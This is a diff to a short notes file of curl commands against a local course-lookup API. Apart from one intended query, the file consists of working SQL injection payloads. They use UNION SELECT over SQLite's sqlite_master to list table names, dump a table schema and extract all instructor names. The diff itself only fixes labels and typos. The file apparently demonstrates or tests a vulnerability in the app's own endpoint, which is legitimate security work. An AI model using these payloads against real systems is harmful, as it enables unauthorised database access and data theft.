@@ -1,4 +1,4 @@
-intended
+intended usage:
 curl --request GET --url 'http://127.0.0.1:3000/course_by_instructor/?=' --header 'Content-Type: application/json' --data '{"instructor": "Heinemann"}'
 
 list all courses:
@@ -7,8 +7,8 @@ curl --request GET --url 'http://127.0.0.1:3000/course_by_instructor/?=' --heade
 list table names:
 curl --request GET --url 'http://127.0.0.1:3000/course_by_instructor/?=' --header 'Content-Type: application/json' --data '{"instructor": "Heinemann%'\'' union select 1,group_concat(tbl_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM sqlite_master WHERE type='\''table'\'' AND tbl_name NOT like '\''sqlite_%'\'' OR '\''1%=1"}'
 
-list all column names:
+list scheme of a table:
 curl --request GET --url 'http://127.0.0.1:3000/course_by_instructor/?=' --header 'Content-Type: application/json' --data '{"instructor": "Heinemann%'\'' union select 1,sql,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM sqlite_master WHERE type!='\''meta'\'' AND sql NOT NULL AND name NOT LIKE '\''sqlite_%'\'' AND name='\''zqm_module_en'\'' OR '\''1%=1"}'
 
-list any dat (here:instructors)a:
+list any data (here: names of all instructors):
 curl --request GET --url 'http://127.0.0.1:3000/course_by_instructor/?=' --header 'Content-Type: application/json' --data '{"instructor": "Heinemann%'\'' union select instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor,instructor from zqm_module_en where instructor='\''*'\'' OR '\''1%=1"}'
